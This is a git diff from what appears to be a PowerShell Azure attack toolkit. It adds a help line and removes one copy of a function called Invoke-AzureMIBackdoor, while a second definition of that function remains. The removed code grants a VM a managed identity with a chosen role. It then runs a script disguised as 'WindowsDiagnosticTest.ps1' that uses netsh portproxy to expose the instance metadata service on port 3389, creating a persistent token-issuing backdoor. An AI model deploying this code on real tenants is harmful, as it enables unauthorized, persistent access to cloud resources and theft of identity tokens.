@@ -177,6 +177,7 @@ Get-AzureDeviceOwner -------------- Lists the owners of devices in AAD. This wil
 Get-AzureADGroup --------------------- Gathers a specific group or all groups in AzureAD and lists their members.
 Get-AzureIntuneScript -------------- Lists available Intune scripts in Azure Intune
 Get-AzureLogicAppConnector --------- Lists the connector APIs in Azure
+Get-AzureManagedIdentities --------- Gets a list of all Managed Identities and their roles.
 Get-AzurePIMAssignment ------------- Gathers the Privileged Identity Management assignments. Currently, only AzureRM roles are returned.
 Get-AzureRole ---------------------- Gets the members of an Azure RBAC role.
 Get-AzureRunAsAccounts ------------- Finds any RunAs accounts being used by an Automation Account
@@ -1883,37 +1884,6 @@ function Get-AzureDeviceOwner
 	}
 }
 
-function Invoke-AzureMIBackdoor
-{
-<# 
-.SYNOPSIS
-    Creates a managed identity for a VM and exposes the REST API on it to make it a persistent JWT backdoor generator.
-
-.PARAMETERS
-	-VM (Name of VM)
-	-Scope (Scope of the role)
-	-Role (Role to apply over the supplied scope)
-	
-.EXAMPLE
-	Invoke-AzureMIBackdoor -VM Win10 -Role Contributor -Scope '/subscriptions/fa2cd1e3-abcd-efghi-jlmnop-0c81f66381d5/'
-#>	
-	$vmobj = Get-AzVM -Name $VM
-	$rg = $vm.ResourceGroupName
-	Write-Host "Creating Managed Identity Service Principal..." -ForegroundColor Yellow
-	$add = Update-AzVM -ResourceGroupName $rg -VM $vm -IdentityType SystemAssigned
-	$sp = Get-AzADServicePrincipal -displayname $vm.name
-	$id = $sp.id
-	$AID = $sp.applicationid
-	$roleadd = New-AzRoleAssignment -ObjectId $id -RoleDefinitionName $role -Scope $scope
-	If($roleadd.RoleDefinitionName -eq $role){
-		$Command = '$ip = (Get-WmiObject -Class Win32_NetworkAdapterConfiguration | where {$_.DHCPEnabled -ne $null -and $_.DefaultIPGateway -ne $null}).IPAddress[0] ;netsh interface portproxy add v4tov4 listenport=3389 listenaddress=$ip connectport=80 connectaddress=169.254.169.254'
-		$new = New-Item -Name "WindowsDiagnosticTest.ps1" -ItemType "file" -Value $Command -Force
-		$path = $new.DirectoryName + '\' + $new.Name 
-		$change = Invoke-AzVMRunCommand -VMName $vm -ResourceGroup $rg -CommandId 'RunPowerShellScript' -ScriptPath $path -verbose
-		$result.value.Message
-		rm $path
-	}
-}
 function Invoke-AzureMIBackdoor
 {
 <# 
